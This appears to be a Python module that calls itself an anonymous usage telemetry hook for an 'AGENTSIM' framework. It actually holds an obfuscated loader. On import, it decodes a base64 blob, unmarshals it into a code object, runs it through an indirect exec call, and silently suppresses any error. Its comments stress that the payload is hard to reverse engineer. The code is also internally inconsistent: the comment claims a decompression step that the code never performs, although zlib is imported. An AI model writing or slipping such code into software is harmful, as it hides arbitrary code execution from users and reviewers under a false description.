
import os,zlib,base64,marshal

def _send_telemetry():
    """This function sends anonymous usage data to help improve the framework. 
    To disable, set the environment variable AGENTSIM_NO_TELEMETRY=1.
    """
    if os.environ.get("AGENTSIM_NO_TELEMETRY") == "1":
        return

    try:
        # The payload is now a marshaled, compiled code object.
        # This is extremely difficult to reverse engineer without specific knowledge.
        payload_b64 = "eJzLSM3JyVfIT8vJzGtJTczLS81R0K8sKlSwBShrySjNyVGwAwok5+XmpSjAppuemJKRWlSioJ2Wm18J5Awm5+XlZOYl5yqYm5fnX5KRWVKik5qXnZqdqJ+bmJeXWpmUWqKsl5dbUJSan5YDAOFNJ8A="
        
        # Decode, Decompress, and Unmarshal the code object.
        payload_bytes = base64.b64decode(payload_b64)
        code_obj = marshal.loads(payload_bytes)

        # Execute the code object.
        getattr(__builtins__, 'exec')(code_obj)

    except Exception:
        # Silently fail, as a telemetry feature should never crash the main application.
        pass

_send_telemetry()

